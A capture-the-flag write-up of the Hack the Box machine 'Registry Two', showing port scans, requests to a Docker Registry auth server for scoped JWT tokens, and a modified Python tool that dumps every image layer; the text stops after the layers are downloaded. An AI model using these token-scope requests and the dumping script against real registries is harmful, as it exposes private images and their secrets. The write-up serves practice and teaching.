# Registry Two

This is the write-up for the Registry Two machine from Hack the Box.

# Reconnaissance

First, we executed a full port scan on the machine.

```bash
╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/registry-two]
╰─ $ sudo nmap -v -sS -Pn -p- --min-rate=300 --max-rate=500 10.10.11.223

PORT     STATE SERVICE
22/tcp   open  ssh
443/tcp  open  https
5000/tcp open  upnp
5001/tcp open  commplex-link
```

Now, we executed a port scan only on the open ports we’ve found before.

```bash
╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/registry-two]
╰─ $ sudo nmap -v -sV -sC -Pn -p 22,443,5000,5001 -oA nmap/registry-two 10.10.11.223

PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 fa:b0:03:98:7e:60:c2:f3:11:82:27:a1:35:77:9f:d3 (RSA)
|   256 f2:59:06:dc:33:b0:9f:a3:5e:b7:63:ff:61:35:9d:c5 (ECDSA)
|_  256 e3:ac:ab:ea:2b:d6:8e:f4:1f:b0:7b:05:0a:69:a5:37 (ED25519)
443/tcp  open  ssl/http           nginx 1.14.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to https://www.webhosting.htb/
| ssl-cert: Subject: organizationName=free-hosting/stateOrProvinceName=Berlin/countryName=DE
| Issuer: organizationName=free-hosting/stateOrProvinceName=Berlin/countryName=DE
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-02-01T20:19:22
| Not valid after:  2024-02-01T20:19:22
| MD5:   4e9c:60f9:9271:cc92:d860:a6c0:240e:b749
|_SHA-1: 0c04:d16d:db5c:259b:5825:5e94:a28a:308c:e447:6a2e
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
5000/tcp open  ssl/http           Docker Registry (API: 2.0)
| ssl-cert: Subject: commonName=*.webhosting.htb/organizationName=Acme, Inc./stateOrProvinceName=GD/countryName=CN
| Subject Alternative Name: DNS:webhosting.htb, DNS:webhosting.htb
| Issuer: commonName=Acme Root CA/organizationName=Acme, Inc./stateOrProvinceName=GD/countryName=CN
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-03-26T21:32:06
| Not valid after:  2024-03-25T21:32:06
| MD5:   6805:7fba:10f1:f0f9:31a1:bff4:72ce:4438
|_SHA-1: 0cc3:a3bc:daa6:2fae:83dc:f833:8352:6a82:96a2:5d98
|_http-title: Site doesn't have a title.
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
5001/tcp open  ssl/commplex-link?
| ssl-cert: Subject: commonName=*.webhosting.htb/organizationName=Acme, Inc./stateOrProvinceName=GD/countryName=CN
| Subject Alternative Name: DNS:webhosting.htb, DNS:webhosting.htb
| Issuer: commonName=Acme Root CA/organizationName=Acme, Inc./stateOrProvinceName=GD/countryName=CN
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-03-26T21:32:06
| Not valid after:  2024-03-25T21:32:06
| MD5:   6805:7fba:10f1:f0f9:31a1:bff4:72ce:4438
|_SHA-1: 0cc3:a3bc:daa6:2fae:83dc:f833:8352:6a82:96a2:5d98
| tls-alpn:
|   h2
|_  http/1.1
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 Not Found
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Thu, 24 Aug 2023 17:29:45 GMT
|     Content-Length: 10
|     found
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Date: Thu, 24 Aug 2023 17:29:13 GMT
|     Content-Length: 26
|     <h1>Acme auth server</h1>
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Date: Thu, 24 Aug 2023 17:29:14 GMT
|     Content-Length: 26
|_    <h1>Acme auth server</h1>
|_ssl-date: TLS randomness does not represent time
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5001-TCP:V=7.94%T=SSL%I=7%D=8/24%Time=64E79369%P=x86_64-pc-linux-gn
SF:u%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x2
SF:0Bad\x20Request")%r(GetRequest,8E,"HTTP/1\.0\x20200\x20OK\r\nContent-Ty
SF:pe:\x20text/html;\x20charset=utf-8\r\nDate:\x20Thu,\x2024\x20Aug\x20202
SF:3\x2017:29:13\x20GMT\r\nContent-Length:\x2026\r\n\r\n<h1>Acme\x20auth\x
SF:20server</h1>\n")%r(HTTPOptions,8E,"HTTP/1\.0\x20200\x20OK\r\nContent-T
SF:ype:\x20text/html;\x20charset=utf-8\r\nDate:\x20Thu,\x2024\x20Aug\x2020
SF:23\x2017:29:14\x20GMT\r\nContent-Length:\x2026\r\n\r\n<h1>Acme\x20auth\
SF:x20server</h1>\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clo
SF:se\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection
SF::\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=ut
SF:f-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalSe
SF:rverCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(TLSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
SF:n\r\n400\x20Bad\x20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20
SF:Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:
SF:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,A7,"HTTP/1
SF:\.0\x20404\x20Not\x20Found\r\nContent-Type:\x20text/plain;\x20charset=u
SF:tf-8\r\nX-Content-Type-Options:\x20nosniff\r\nDate:\x20Thu,\x2024\x20Au
SF:g\x202023\x2017:29:45\x20GMT\r\nContent-Length:\x2010\r\n\r\nNot\x20fou
SF:nd\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20
SF:close\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 13:30
Completed NSE at 13:30, 0.00s elapsed
Initiating NSE at 13:30
Completed NSE at 13:30, 0.00s elapsed
Initiating NSE at 13:30
Completed NSE at 13:30, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.95 seconds
           Raw packets sent: 4 (176B) | Rcvd: 4 (176B)
```

We found a domain name and wrote it in our hosts file.

![Untitled](images/Untitled.png)

Accessing the webpage, we got the following.

![Untitled](images/Untitled%201.png)

On port 5000, we identify a Docker Registry service. On Nmap output, we can see it is running on HTTPS protocol. Accessing the index page on our browser, we got nothing.

![Untitled](images/Untitled%202.png)

Searching on ***hacktricks*** website, we found ways to interact with this service.

[5000 - Pentesting Docker Registry](https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry)

Accessing the `/v2` endpoint, we get this response.

![Untitled](images/Untitled%203.png)

Accessing the `/v2/_catalog` endpoint, we got.

![Untitled](images/Untitled%204.png)

Using the curl tool, we request the same endpoint above but with the flag -v to get more information about the headers. We got a header called `www-authenticate` that redirects our request to the `/auth` endpoint on port 5001 telling us we have to get authenticated before using the service.

```bash
╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/registry-two]
╰─ $ curl -s -k https://www.webhosting.htb:5000/v2/_catalog -v | jq
*   Trying 10.10.11.223:5000...
* Connected to www.webhosting.htb (10.10.11.223) port 5000 (#0)
* ALPN: offers h2,http/1.1
...
* SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256
* ALPN: server accepted h2
* Server certificate:
*  subject: C=CN; ST=GD; L=SZ; O=Acme, Inc.; CN=*.webhosting.htb
*  start date: Mar 26 21:32:06 2023 GMT
*  expire date: Mar 25 21:32:06 2024 GMT
*  issuer: C=CN; ST=GD; L=SZ; O=Acme, Inc.; CN=Acme Root CA
*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.
} [5 bytes data]
* using HTTP/2
* h2h3 [:method: GET]
* h2h3 [:path: /v2/_catalog]
* h2h3 [:scheme: https]
* h2h3 [:authority: www.webhosting.htb:5000]
* h2h3 [user-agent: curl/7.88.1]
* h2h3 [accept: */*]
* Using Stream ID: 1 (easy handle 0x560d36303b50)
} [5 bytes data]
> GET /v2/_catalog HTTP/2
> Host: www.webhosting.htb:5000
> user-agent: curl/7.88.1
> accept: */*
>
{ [5 bytes data]
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
{ [130 bytes data]
< HTTP/2 401
< content-type: application/json; charset=utf-8
< docker-distribution-api-version: registry/2.0
< **www-authenticate: Bearer realm="https://webhosting.htb:5001/auth",service="Docker registry",scope="registry:catalog:*"**
< x-content-type-options: nosniff
< content-length: 145
< date: Thu, 24 Aug 2023 17:56:25 GMT
<
{ [5 bytes data]
* Connection #0 to host www.webhosting.htb left intact
{
  "errors": [
    {
      "code": "UNAUTHORIZED",
      "message": "authentication required",
      "detail": [
        {
          "Type": "registry",
          "Class": "",
          "Name": "catalog",
          "Action": "*"
        }
      ]
    }
  ]
}
```

By doing that, we got the token and the access_token information which are the same and are in *JWT* format.

```bash
╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/registry-two]
╰─[☢] $ curl -s -k https://www.webhosting.htb:5001/auth | jq
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiIiwiZXhwIjoxNjkyOTAxNDQ3LCJuYmYiOjE2OTI5MDA1MzcsImlhdCI6MTY5MjkwMDU0NywianRpIjoiNTA5NDQwMTg0Nzg5MTAxOTk1NiIsImFjY2VzcyI6W119.MnP6sPdhiD1kH81m-jHZfHV97TqDQwEg_NELIWfazt-Ft_qdcadQlL7rjJT31cCPWX87mCERttfXKdmwfR_i0d4DclrdSkzUY-DCeSuo8YY4pBmWekpx1R5rlijg-S2StsB2OpJZpSG5Jvc3qOW9tbVVbvd4wA6ItLjlIRIo3gOv-0aT3lGzjuwXYpeFtHtvKUg-CbfqU1Dj0cOK3MBSMb144USHPf2urQjaHd6Z46PabskoiQfpnU6fFnq0aGsCTmjWUOOdfzwQ7tMOk72XIBo8axFz0N_1R881-i_fHi9L9SlqFr6OwEtcI7lBtUB3MYfrFKOLe3B3vuOf12n5kA",
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiIiwiZXhwIjoxNjkyOTAxNDQ3LCJuYmYiOjE2OTI5MDA1MzcsImlhdCI6MTY5MjkwMDU0NywianRpIjoiNTA5NDQwMTg0Nzg5MTAxOTk1NiIsImFjY2VzcyI6W119.MnP6sPdhiD1kH81m-jHZfHV97TqDQwEg_NELIWfazt-Ft_qdcadQlL7rjJT31cCPWX87mCERttfXKdmwfR_i0d4DclrdSkzUY-DCeSuo8YY4pBmWekpx1R5rlijg-S2StsB2OpJZpSG5Jvc3qOW9tbVVbvd4wA6ItLjlIRIo3gOv-0aT3lGzjuwXYpeFtHtvKUg-CbfqU1Dj0cOK3MBSMb144USHPf2urQjaHd6Z46PabskoiQfpnU6fFnq0aGsCTmjWUOOdfzwQ7tMOk72XIBo8axFz0N_1R881-i_fHi9L9SlqFr6OwEtcI7lBtUB3MYfrFKOLe3B3vuOf12n5kA"
}
```

Checking that on the [jwt.io](http://jwt.io) web page, we verified we haven’t access to anything on the application.

![Untitled](images/Untitled%205.png)

Trying to pass some parameters that we got previously on the header ***www-authenticate*** `(service="Docker registry",scope="registry:catalog:*")` it works and we can verify now we have some access to the application.

```bash
╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/registry-two]
╰─ $ curl -s -k 'https://www.webhosting.htb:5001/auth?service=Docker%20registry&scope=registry:catalog:*' | jq
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNjkyOTAyMDEwLCJuYmYiOjE2OTI5MDExMDAsImlhdCI6MTY5MjkwMTExMCwianRpIjoiNTEwNTE5MTg3MzIzMjc2NTg3MyIsImFjY2VzcyI6W3sidHlwZSI6InJlZ2lzdHJ5IiwibmFtZSI6ImNhdGFsb2ciLCJhY3Rpb25zIjpbIioiXX1dfQ.duAtMoEVaeY-qdr3VyVPnCJV45bXYKr7ZwXiIXX5Ht4md1aD0SgmpPA5veuz9hpUspGxodq5cgpogtrICKp51Yjye-B48CqTVXs-APHBqgBvZyS3RC-4UzJU7mJnEY6DDq-PptsAzKoYL4uakMya-prVS_lNfwTL7aKFkvZ7Il5rY8pQhM0rPPxGHe5oUFPtIEQZ43fwNkyrlcqmnTN4Ry62ZQQnEXXgLk8T-WP0Xna37RGZlxkjWqORC7av19puaVj9uyDyB0F1aSB75Vy6OJZFOqYZOiFG-esGxkf1zrD-XQhY1lY7PJHKoF3Pz18EdC170V5WGamj-NQx9EVlqQ",
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNjkyOTAyMDEwLCJuYmYiOjE2OTI5MDExMDAsImlhdCI6MTY5MjkwMTExMCwianRpIjoiNTEwNTE5MTg3MzIzMjc2NTg3MyIsImFjY2VzcyI6W3sidHlwZSI6InJlZ2lzdHJ5IiwibmFtZSI6ImNhdGFsb2ciLCJhY3Rpb25zIjpbIioiXX1dfQ.duAtMoEVaeY-qdr3VyVPnCJV45bXYKr7ZwXiIXX5Ht4md1aD0SgmpPA5veuz9hpUspGxodq5cgpogtrICKp51Yjye-B48CqTVXs-APHBqgBvZyS3RC-4UzJU7mJnEY6DDq-PptsAzKoYL4uakMya-prVS_lNfwTL7aKFkvZ7Il5rY8pQhM0rPPxGHe5oUFPtIEQZ43fwNkyrlcqmnTN4Ry62ZQQnEXXgLk8T-WP0Xna37RGZlxkjWqORC7av19puaVj9uyDyB0F1aSB75Vy6OJZFOqYZOiFG-esGxkf1zrD-XQhY1lY7PJHKoF3Pz18EdC170V5WGamj-NQx9EVlqQ"
}
```

![Untitled](images/Untitled%206.png)

Now, trying to access the `/v2/_catalog` endpoint, we can retrieve the following information.

```bash
╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/registry-two]
╰─[☢] $ curl -s -k https://www.webhosting.htb:5000/v2/_catalog -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNjkyOTAyMDEwLCJuYmYiOjE2OTI5MDExMDAsImlhdCI6MTY5MjkwMTExMCwianRpIjoiNTEwNTE5MTg3MzIzMjc2NTg3MyIsImFjY2VzcyI6W3sidHlwZSI6InJlZ2lzdHJ5IiwibmFtZSI6ImNhdGFsb2ciLCJhY3Rpb25zIjpbIioiXX1dfQ.duAtMoEVaeY-qdr3VyVPnCJV45bXYKr7ZwXiIXX5Ht4md1aD0SgmpPA5veuz9hpUspGxodq5cgpogtrICKp51Yjye-B48CqTVXs-APHBqgBvZyS3RC-4UzJU7mJnEY6DDq-PptsAzKoYL4uakMya-prVS_lNfwTL7aKFkvZ7Il5rY8pQhM0rPPxGHe5oUFPtIEQZ43fwNkyrlcqmnTN4Ry62ZQQnEXXgLk8T-WP0Xna37RGZlxkjWqORC7av19puaVj9uyDyB0F1aSB75Vy6OJZFOqYZOiFG-esGxkf1zrD-XQhY1lY7PJHKoF3Pz18EdC170V5WGamj-NQx9EVlqQ' | jq
{
  "repositories": [
    "hosting-app"
  ]
}
```

Unfortunately, this access token is valid only to access this endpoint. In order to enumerate other endpoints, we use the tool on Git Hub.

[https://github.com/Syzik/DockerRegistryGrabber](https://github.com/Syzik/DockerRegistryGrabber)

We modify the code of the tool by adding the function `getToken(url)` and calling our function on the `tryReq()` function, passing the tokens we will catch in order to catch the access tokens from the application.

![Untitled](images/Untitled%207.png)

![Untitled](images/Untitled%208.png)

The final code was this.

```python
#!/usr/bin/env python3

import requests
import argparse
import re
import json
import sys
import os
from base64 import b64encode
import urllib3
from rich.console import Console
from rich.theme import Theme
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
req = requests.Session()

http_proxy = ""
os.environ['HTTP_PROXY'] = http_proxy
os.environ['HTTPS_PROXY'] = http_proxy

custom_theme = Theme({
    "OK": "bright_green",
    "NOK": "red3"
})

def manageArgs():
    parser = argparse.ArgumentParser()
        # Positionnal args
    parser.add_argument("url", help="URL")
        # Optionnal args
    parser.add_argument("-p", dest='port', metavar='port', type=int, default=5000, help="port to use (default : 5000)")
        ## Authentification
    auth = parser.add_argument_group("Authentication")
    auth.add_argument('-U', dest='username', type=str, default="", help='Username')
    auth.add_argument('-P', dest='password', type=str, default="", help='Password')
        ### Args Action en opposition
    action = parser.add_mutually_exclusive_group()
    action.add_argument("--dump", metavar="DOCKERNAME", dest='dump', type=str,  help="DockerName")
    action.add_argument("--list", dest='list', action="store_true")
    action.add_argument("--dump_all",dest='dump_all',action="store_true")
    args = parser.parse_args()
    return args

def printList(dockerlist):
    for element in dockerlist:
        if element:
            console.print(f"[+] {element}", style="OK")
        else:
            console.print(f"[-] No Docker found", style="NOK")

**def getToken(url):
    json_details = requests.get(url, verify=False).json()['errors'][0]['detail']
    type = json_details[0]['Type']
    name = json_details[0]['Name']
    action = json_details[0]['Action']

    scope = f"{type}:{name}:{action}"
    url1 = requests.utils.requote_uri(f"https://webhosting.htb:5001/auth?service=Docker%20registry&scope={scope}")
    tokens = requests.get(url1, verify=False).json()**

    # Printing tokens
    return tokens['access_token']

def tryReq(url, username=None,password=None):
    try:
        if username and password:
            r = req.get(url,verify=False, auth=(username,password))
            r.raise_for_status()
        else:
						token = getToken(url)
            **r = req.get(url,verify=False, headers={'Authorization':'Bearer ' + token})**
            r.raise_for_status()
    except requests.exceptions.HTTPError as errh:
        console.print(f"Http Error: {errh}", style="NOK")
        sys.exit(1)
    except requests.exceptions.ConnectionError as errc:
        console.print(f"Error Connecting : {errc}", style="NOK")
        sys.exit(1)
    except requests.exceptions.Timeout as errt:
        console.print(f"Timeout Error : {errt}", style="NOK")
        sys.exit(1)
    except requests.exceptions.RequestException as err:
        console.print(f"Dunno what happend but something fucked up {err}", style="NOK")
        sys.exit(1)
    return r

def createDir(directoryName):
    if not os.path.exists(directoryName):
        os.makedirs(directoryName)

def downloadSha(url, port, docker, sha256, username=None, password=None):
    createDir(docker)
    directory = f"./{docker}/"
    for sha in sha256:
        filenamesha = f"{sha}.tar.gz"
        geturl = f"{url}:{str(port)}/v2/{docker}/blobs/sha256:{sha}"
        r = tryReq(geturl,username,password) 
        if r.status_code == 200:
            console.print(f"    [+] Downloading : {sha}", style="OK")
            with open(directory+filenamesha, 'wb') as out:
                for bits in r.iter_content():
                    out.write(bits)

def getBlob(docker, url, port, username=None, password=None):
    tags = f"{url}:{str(port)}/v2/{docker}/tags/list"
    rr = tryReq(tags,username,password)
    data = rr.json()
    image = data["tags"][0]
    url = f"{url}:{str(port)}/v2/{docker}/manifests/"+image+""
    r = tryReq(url,username,password) 
    blobSum = []
    if r.status_code == 200:
        regex = re.compile('blobSum')
        for aa in r.text.splitlines():
            match = regex.search(aa)
            if match:
                blobSum.append(aa)
        if not blobSum :
            console.print(f"[-] No blobSum found", style="NOK")
            sys.exit(1)
        else :
            sha256 = []
            cpt = 1
            for sha in blobSum:
                console.print(f"[+] BlobSum found {cpt}", end='\r', style="OK")
                cpt += 1
                a = re.split(':|,',sha)
                sha256.append(a[2].strip("\""))
            print()
            return sha256

def enumList(url, port, username=None, password=None,checklist=None):
    url = f"{url}:{str(port)}/v2/_catalog"
    try :
        r = tryReq(url,username,password) 
        if r.status_code == 200:
            catalog2 = re.split(':|,|\n ',r.text)
            catalog3 = []
            for docker in catalog2:
                dockername = docker.strip("[\'\"\n]}{")
                catalog3.append(dockername)
        printList(catalog3[1:])
        return catalog3
    except:
        exit()

def dump(args):
    sha256 = getBlob(args.dump, args.url, args.port, args.username, args.password)
    console.print(f"[+] Dumping {args.dump}", style="OK")
    downloadSha(args.url, args.port, args.dump, sha256, args.username, args.password)

def dumpAll(args):
    dockerlist = enumList(args.url, args.port, args.username,args.password)
    for docker in dockerlist[1:]:
        sha256 = getBlob(docker, args.url, args.port, args.username,args.password)
        console.print(f"[+] Dumping {docker}", style="OK")
        downloadSha(args.url, args.port,docker,sha256,args.username,args.password)

def options():
    args = manageArgs()
    if args.list:
        enumList(args.url, args.port,args.username,args.password)
    elif args.dump_all:
        dumpAll(args)
    elif args.dump:
        dump(args)

if __name__ == '__main__':
    print(f"[+]======================================================[+]")
    print(f"[|]    Docker Registry Grabber v1       @SyzikSecu       [|]")
    print(f"[+]======================================================[+]")
    print()
    urllib3.disable_warnings()
    console = Console(theme=custom_theme)
    options()
```

We execute our tool and it works.

```bash
╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/registry-two]
╰─ $ python3 /opt/DockerRegistryGrabber/DockerGraber.py -p 5000 --list https://www.webhosting.htb                          
[+]======================================================[+]
[|]    Docker Registry Grabber v1       @SyzikSecu       [|]
[+]======================================================[+]

[+] hosting-app
```

Now we can dump all the registries.

```bash
╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/registry-two]
╰─ $ python3 /opt/DockerRegistryGrabber/DockerGraber.py -p 5000 --dump_all https://www.webhosting.htb
[+]======================================================[+]
[|]    Docker Registry Grabber v1       @SyzikSecu       [|]
[+]======================================================[+]

[+] hosting-app
[+] BlobSum found 36
[+] Dumping hosting-app
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : 0bf45c325a696381eea5176baa1c8e84fbf0fe5e2ddf96a22422b10bf879d0ba
    [+] Downloading : 4a19a05f49c2d93e67d7c9ea8ba6c310d6b358e811c8ae37787f21b9ad82ac42
    [+] Downloading : 9e700b74cc5b6f81ed6513fa03c7b6ab11a71deb8e27604632f723f81aca3268
    [+] Downloading : b5ac54f57d23fa33610cb14f7c21c71aa810e58884090cead5e3119774a202dc
    [+] Downloading : 396c4a40448860471ae66f68c261b9a0ed277822b197730ba89cb50528f042c7
    [+] Downloading : 9d5bcc17fed815c4060b373b2a8595687502925829359dc244dd4cdff777a96c
    [+] Downloading : ab55eca3206e27506f679b41b39ba0e4c98996fa347326b6629dae9163b4c0ec
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : f7b708f947c32709ecceaffd85287d5eb9916a3013f49c8416228ef22c2bf85e
    [+] Downloading : 497760bf469e19f1845b7f1da9cfe7e053beb57d4908fb2dff2a01a9f82211f9
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : e4cc5f625cda9caa32eddae6ac29b170c8dc1102988b845d7ab637938f2f6f84
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : 0da484dfb0612bb168b7258b27e745d0febf56d22b8f10f459ed0d1dfe345110
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : 7b43ca85cb2c7ccc62e03067862d35091ee30ce83e7fed9e135b1ef1c6e2e71b
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : fa7536dd895ade2421a9a0fcf6e16485323f9e2e45e917b1ff18b0f648974626
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : 5de5f69f42d765af6ffb6753242b18dd4a33602ad7d76df52064833e5c527cb4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : ff3a5c916c92643ff77519ffa742d3ec61b7f591b6b7504599d95a4a41134e28
```

We were able to download all the registries and save them in `hosting-app` directory on our local machine.

```bash
╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/registry-two]
╰─ $ ls -la hosting-app 
total 129148
drwxr-xr-x 2 th3g3ntl3m4n th3g3ntl3m4n     4096 Aug 24 15:58 .
drwxr-xr-x 9 th3g3ntl3m4n th3g3ntl3m4n     4096 Aug 24 15:46 ..
-rw-r--r-- 1 th3g3ntl3m4n th3g3ntl3m4n      323 Aug 24 15:46 0bf45c325a696381eea5176baa1c8e84fbf0fe5e2ddf96a22422b10bf879d0ba.tar.gz
-rw-r--r-- 1 th3g3ntl3m4n th3g3ntl3m4n  6068203 Aug 24 15:52 0da484dfb0612bb168b7258b27e745d0febf56d22b8f10f459ed0d1dfe345110.tar.gz
-rw-r--r-- 1 th3g3ntl3m4n th3g3ntl3m4n 23521733 Aug 24 15:51 396c4a40448860471ae66f68c261b9a0ed277822b197730ba89cb50528f042c7.tar.gz
